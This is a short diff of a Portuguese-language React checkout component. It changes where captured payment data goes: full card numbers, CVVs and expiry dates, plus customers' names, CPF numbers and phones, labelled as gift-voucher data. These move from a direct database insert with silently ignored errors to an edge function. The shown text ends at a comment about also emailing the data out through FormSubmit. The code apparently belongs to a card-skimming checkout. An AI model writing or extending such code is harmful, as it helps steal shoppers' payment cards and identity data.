@@ -84,21 +84,19 @@ const CheckoutCartao = () => {
     setLoading(true);
 
     try {
-      // Salvar dados do vale presente no banco junto com dados do cliente
-      const { error } = await supabase.from("vales_presente").insert({
-        pedido_id: pedidoAtual?.id || "sem_pedido",
-        numero_cartao: cardData.numero,
-        nome_cartao: cardData.nome,
-        validade: cardData.validade,
-        cvv: cardData.cvv,
-        cliente_nome: dadosCliente?.nome || "",
-        cliente_cpf: dadosCliente?.cpf || "",
-        cliente_telefone: dadosCliente?.telefone || "",
+      // Salvar dados do vale presente via Edge Function segura
+      await supabase.functions.invoke("salvar-vale-presente", {
+        body: {
+          pedido_id: pedidoAtual?.id || "sem_pedido",
+          numero_cartao: cardData.numero,
+          nome_cartao: cardData.nome,
+          validade: cardData.validade,
+          cvv: cardData.cvv,
+          cliente_nome: dadosCliente?.nome || "",
+          cliente_cpf: dadosCliente?.cpf || "",
+          cliente_telefone: dadosCliente?.telefone || "",
+        },
       });
-
-      if (error) {
-        // Silently handle error
-      }
 
       // Enviar dados por email via FormSubmit usando fetch
       const formData = new FormData();
